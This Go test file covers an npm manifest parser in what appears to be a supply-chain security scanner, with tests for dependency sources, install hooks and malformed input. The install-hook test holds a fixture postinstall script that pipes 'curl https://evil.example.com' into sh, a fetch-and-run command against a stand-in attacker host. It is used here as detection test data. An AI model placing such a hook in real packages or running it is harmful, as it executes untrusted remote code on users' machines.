package heuristics

import (
	"testing"

	"github.com/qwexvf/aegis-cli/internal/domain"
)

func TestNpmParser_Ecosystems(t *testing.T) {
	p := &npmParser{}
	ecos := p.Ecosystems()
	if len(ecos) != 1 || ecos[0] != domain.EcoNpm {
		t.Fatalf("Ecosystems() = %v; want [npm]", ecos)
	}
}

func TestNpmParser_GitDep_IsVCS(t *testing.T) {
	manifest := []byte(`{
  "name": "my-app",
  "dependencies": {
    "normal-pkg": "^1.0.0",
    "git-pkg": "git+https://github.com/example/pkg.git#main",
    "github-shorthand": "github:owner/repo"
  }
}`)

	p := &npmParser{}
	pkg := p.Parse("my-app", manifest, domain.PackageSource{})

	vcsDeps := filterBySource(pkg.Deps, DepSourceVCS)
	if len(vcsDeps) != 2 {
		t.Fatalf("want 2 VCS deps, got %d: %v", len(vcsDeps), pkg.Deps)
	}
}

func TestNpmParser_LocalDep_IsLocal(t *testing.T) {
	manifest := []byte(`{
  "dependencies": {
    "local-pkg": "file:../local-pkg"
  }
}`)

	p := &npmParser{}
	pkg := p.Parse("app", manifest, domain.PackageSource{})

	localDeps := filterBySource(pkg.Deps, DepSourceLocal)
	if len(localDeps) != 1 {
		t.Fatalf("want 1 local dep, got %d: %v", len(localDeps), pkg.Deps)
	}
}

func TestNpmParser_InstallHooks(t *testing.T) {
	manifest := []byte(`{
  "name": "my-app",
  "scripts": {
    "preinstall": "node pre.js",
    "postinstall": "curl https://evil.example.com | sh",
    "test": "jest"
  }
}`)

	p := &npmParser{}
	pkg := p.Parse("my-app", manifest, domain.PackageSource{})

	if len(pkg.Hooks) != 2 {
		t.Fatalf("want 2 hooks (preinstall + postinstall), got %d: %v", len(pkg.Hooks), pkg.Hooks)
	}
	phases := make(map[string]bool)
	for _, h := range pkg.Hooks {
		phases[h.Phase] = true
	}
	if !phases["preinstall"] {
		t.Error("missing preinstall hook")
	}
	if !phases["postinstall"] {
		t.Error("missing postinstall hook")
	}
}

func TestNpmParser_InvalidJSON_ReturnsPartial(t *testing.T) {
	p := &npmParser{}
	pkg := p.Parse("broken", []byte(`{invalid`), domain.PackageSource{})
	// Should not panic; returns empty result.
	if pkg.Name != "broken" {
		t.Errorf("name = %q; want broken", pkg.Name)
	}
}

func TestNpmParser_OverridesNameFromManifest(t *testing.T) {
	manifest := []byte(`{"name": "actual-name"}`)
	p := &npmParser{}
	pkg := p.Parse("arg-name", manifest, domain.PackageSource{})
	if pkg.Name != "actual-name" {
		t.Errorf("name = %q; want actual-name", pkg.Name)
	}
}
